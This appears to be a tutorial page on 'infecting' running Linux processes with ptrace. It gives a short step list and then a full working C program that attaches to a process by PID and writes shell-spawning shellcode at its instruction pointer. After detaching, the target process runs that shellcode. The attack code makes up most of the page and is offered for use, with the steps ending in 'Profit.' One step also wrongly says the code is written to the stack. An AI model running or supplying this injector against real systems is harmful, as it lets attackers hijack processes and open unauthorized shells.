# Infecting Running Processes

Ptrace is a system call which can be used to debug/modify another process. We need specific privileges to run ptrace though. we can use ptrace to exploit a running process.&#x20;

the entire process can be broken down as such:

1. Attach to the a current running process by gathering its PID.
2. Send a SIGSTOP to the program to halt it's execution
3. Dump its registers (specifically rip/eip)
4. Write your code to the stack where rip is pointing to.
5. Send a SIGCONT to the program to return control.
6. Profit.

```c
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>

#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

#include <sys/user.h>
#include <sys/reg.h>

#define SHELLCODE_SIZE 32

// Spawn Shell
unsigned char *shellcode =
	"\x48\x31\xc0\x48\x89\xc2\x48\x89"
	"\xc6\x48\x8d\x3d\x04\x00\x00\x00"
	"\x04\x3b\x0f\x05\x2f\x62\x69\x6e"
	"\x2f\x73\x68\x00\xcc\x90\x90\x90";

int inject_data (pid_t pid, unsigned char *src, void *dst, int len) {

	int	i;
	uint32_t *s = 	(uint32_t *) src;
	uint32_t *d =	(uint32_t *) dst;

	for(i=0; i<len; i+=4, s++, d++) {
		if ((ptrace (PTRACE_POKETEXT, pid, d, *s)) < 0) {
			perror("ptrace(POKETEXT):");
			return -1;
		}
	}

	return 0;
}

int main (int argc, char *argv[]) {

	pid_t	target;
	struct 	user_regs_struct	regs;
	int		syscall;
	long	dst;

	if (argc != 2) {
		fprintf(stderr, "Usage:\n\t%s pid\n", argv[0]);
		exit(1);
	}

	target = atoi(argv[1]);
	printf("+ Tracing process %d\n", target);

	if ((ptrace (PTRACE_ATTACH, target, NULL, NULL)) < 0) {
		perror("ptrace(ATTACH):");
		exit(1);
	}

	printf("+ Waiting for process...\n");
	wait(NULL);

	printf("+ Getting Registers\n");
	if ((ptrace (PTRACE_GETREGS, target, NULL, &regs)) < 0) {
		perror ("ptrace(GETREGS):");
		exit(1);
	}

	printf("+ Injecting shellcode at %p\n", (void*)regs.rip);
	inject_data (target, shellcode, (void*)regs.rip, SHELLCODE_SIZE);
	regs.rip += 2;
	printf("+ Setting instruction pointer to %p\n", (void*)regs.rip);
	if ((ptrace (PTRACE_SETREGS, target, NULL, &regs)) < 0) {
		perror("ptrace(GETREGS):");
		exit(1);
	}

	printf("+ Run it!\n");
	if ((ptrace (PTRACE_DETACH, target, NULL, NULL)) < 0) {
		perror("ptrace(DETACH):");
		exit(1);
	}

	return 0;
}
```
